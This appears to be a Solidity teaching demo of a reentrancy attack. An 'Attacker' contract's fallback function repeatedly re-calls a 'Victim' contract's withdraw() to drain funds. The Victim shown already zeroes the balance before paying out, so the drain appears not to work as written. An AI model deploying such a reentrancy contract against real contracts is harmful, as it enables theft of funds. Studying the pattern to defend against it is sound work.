pragma solidity ^0.4.8;

contract Victim {
    
    uint public owedToAttacker;
    address selfAddress ;
    
    
    function Victim(){
         selfAddress  = this;
        owedToAttacker = 11;
    }
    
    function withdraw(){
        uint amount = owedToAttacker;
        owedToAttacker = 0;
        if(!msg.sender.call.value(amount)()) throw;
        //owedToAttacker = 0;
    }
   
   function showBalance() public  returns (uint) {
        return  selfAddress.balance / 1000000000000000000;
    }
    
    //depoist tome funds to work here in the
    function deposit() payable {}
}


contract Attacker{
    
    Victim v;
    uint  public count;
    address selfAddress ;
    
    event LogFallBack(uint count, uint balance);
    
   
    function Attacker(address victim) payable {
         v = Victim(victim);
    }
    
    function attack(){
        v.withdraw();
    }
    
    function showBalance() public  returns (uint) {
        return  selfAddress.balance / 1000000000000000000;
    }
    
    
    function () payable {
        count ++;
        LogFallBack(count, this.balance);
        
        if(count < 39)  v.withdraw();
    }
    
}